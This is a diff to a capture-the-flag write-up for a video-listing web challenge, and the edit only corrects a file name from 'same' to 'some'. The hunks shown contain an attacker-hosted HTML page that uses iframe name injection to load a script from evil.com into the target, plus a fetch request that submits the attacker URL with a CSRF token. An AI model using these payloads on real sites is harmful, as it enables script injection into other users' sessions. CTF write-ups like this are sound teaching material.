@@ -142,11 +142,11 @@ We create five videos, each one with a different title. The example we'll run wi
 
 #### 2. Collecting the HTML and Rendering it
 
-We create an HTML page on our own server (`http://evil.com/same.html`):
+We create an HTML page on our own server (`http://evil.com/some.html`):
 
 ```html
 <iframe src="https://somevideos.appsecil.ctf.today/" name="x" onload="go()"></iframe>
-<iframe id="y" name="s = document.createElement('script'); s.src='http://evil.com/same.js';document.head.appendChild(s);"></iframe>
+<iframe id="y" name="s = document.createElement('script'); s.src='http://evil.com/some.js';document.head.appendChild(s);"></iframe>
 
 <script>
 function loadIframe(uid){
@@ -216,7 +216,7 @@ fetch("/videos/listing-request", {
     },
     body: new URLSearchParams({
       csrf: 'ELT+o9BwjBfvY4lpXg8SYQzNtlAJP8Fs6POEdTC9ZfA=',
-      url: 'http://evil.com/same.html'
+      url: 'http://evil.com/some.html'
     })
   });
 ```
